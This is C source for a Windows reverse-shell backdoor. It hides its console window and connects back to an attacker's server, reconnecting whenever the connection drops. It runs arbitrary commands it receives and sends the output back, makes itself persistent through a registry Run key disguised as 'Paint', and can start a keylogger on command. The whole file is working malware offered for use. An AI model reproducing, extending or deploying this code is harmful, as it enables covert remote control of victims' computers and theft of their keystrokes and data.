#include "../../libs/common.h"
#include <sys/stat.h>
#include <sys/types.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include "../../libs/keylogger.h"

//====== Global Variables =======//
int sock;
struct sockaddr_in ServAddr;

void Shell();

//============ Check & Close Socket on Server Disconnect ============//
boolean connected(SOCKET sock) {
    char buf;
    int err = recv(sock, &buf, 1, MSG_PEEK);
    if (err == SOCKET_ERROR) {
        if (WSAGetLastError() != WSAEWOULDBLOCK) {
            closesocket(sock);
            return FALSE;
        }
    }
    return TRUE;
}

//============ Reconnect to Server ============//
void reconnect() {
    // AF_INET represents connection over IPv4
    // SOCK_STREAM defines TCP connection
    // definition: WINSOCK_API_LINKAGE SOCKET WSAAPI socket(int af, int type, int protocol);
    sock = socket(AF_INET, SOCK_STREAM, 0);

    while (connect(sock, (struct sockaddr *)&ServAddr, sizeof(ServAddr)) != 0) {
        Sleep(10000); // 30 sec
    }

    Shell();
}

//============ Cut a string between given indexes  ============//
char *slice_str(char str[], int slice_from, int slice_to) {
    if (str[0] == '\0') {
        return NULL;
    }

    char *buff;
    size_t str_len, buffer_len;

    if (slice_to < 0 && slice_from > slice_to) {
        str_len = strlen(str);
        if (abs(slice_to) > str_len - 1) {
            return NULL;
        }
        if (abs(slice_from) > str_len){
            slice_from = (-1) * str_len;
        }

        buffer_len = slice_to - slice_from;
        str += (str_len + slice_from);
    } else if (slice_from >= 0 && slice_to > slice_from) {
        str_len = strlen(str);

        if (slice_from > str_len - 1){
            return NULL;
        }

        buffer_len = slice_to - slice_from;
        str += slice_from;
    } else {
        return NULL;
    }

    buff = calloc(buffer_len, sizeof(char));
    strncpy(buff, str, buffer_len);
    return buff;
}

//============ run Command on Target Machine & send Response ============//
void runCmd(char cmd[1024], char (*container)[1024], char (*total_response)[18384]) {
    FILE *fp;
    // Create a pipe and execute a command asynchronously.
    fp = _popen(cmd, "r");

    // store first 1024 bytes of resonse in container
    // when response exceeds 1024 bytes, add container to total_resonse
    while (fgets(*container, 1024, fp) != NULL) {
        strcat(*total_response, *container);
    }

    // send response to server
    send(sock, *total_response, sizeof(*total_response), 0);
    // close file descriptor
    fclose(fp);
}

//============ Edit Registry for Persistance ============//
int editRegistry() {
    char err[] = "Failed\n";
    char suc[] = "Created Persistence At : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";
    TCHAR szPath[MAX_PATH]; // 260
    HKEY NewVal;
    DWORD pathLen = GetModuleFileName(NULL, szPath, MAX_PATH);
    DWORD pathLenInBytes = pathLen * sizeof(*szPath);

    if (pathLen == 0) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewVal) != ERROR_SUCCESS) {
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    if (RegSetValueEx(NewVal, TEXT("Paint"), 0, REG_SZ, (LPBYTE)szPath, pathLenInBytes) != ERROR_SUCCESS) {
        RegCloseKey(NewVal);
        send(sock, err, sizeof(err), 0);
        return -1;
    }

    RegCloseKey(NewVal);
    send(sock, suc, sizeof(suc), 0);
    return 0;
}

//============ Shell ============//
void Shell() {
    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while (connected(sock)) {
        bzero(buffer, 1024);
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        // receive variables
        recv(sock, buffer, 1024, 0);

        // quit - quit the connection
        if (strncmp("quit", buffer, 4) == 0) {
            closesocket(sock);
            WSACleanup();
            exit(0);
        } 
        // cd - change working dir
        else if (strncmp("cd ", buffer, 3) == 0) {
            // extract directory name leaving "cd "
            chdir(slice_str(buffer, 3, 100));
            runCmd("cd", &container, &total_response);
        }
        // persist - edit registry to auto start
        else if (strncmp("persist", buffer, 7) == 0) {
            editRegistry();
        }
        // start keylogger - start logging key pressed in background thread
        else if (strncmp("start keylogger", buffer, 15) == 0) {
            HANDLE thread = CreateThread(NULL, 0, logKey, NULL, 0, NULL);
        }
        // default
        else {
            runCmd(buffer, &container, &total_response);
        }
    }

    reconnect();
}

//======================= Main =======================//

/**
 * hInstance: HInstance is a handle needed by window creation, menus, and a whole host of
   other functions to identify the correct program and instance when passing
   commands or requesting data.
   
 * hPrev: used in 16bit windows, now 0
   lpCmdLine: contains command line arguments
   nCmdShow: flag for main application window state (minimized, maximized or normal)
***/

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow) {
    // hide the window
    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);

    // setup socket for connection
    WSADATA wsaData;

    /**
     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL.
     * It allows an application or DLL to specify the version of Windows Sockets required and
     * retrieve details of the specific Windows Sockets implementation.
     * 
     * WSAStartup function initiates use of Winsock DLL by a process.
     **/
    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
        exit(1);
    }

    memset(&ServAddr, 0, sizeof(ServAddr));
    // define params for ServAddr variable
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(SERVER_IP);
    ServAddr.sin_port = htons(SERVER_PORT);

    reconnect();
}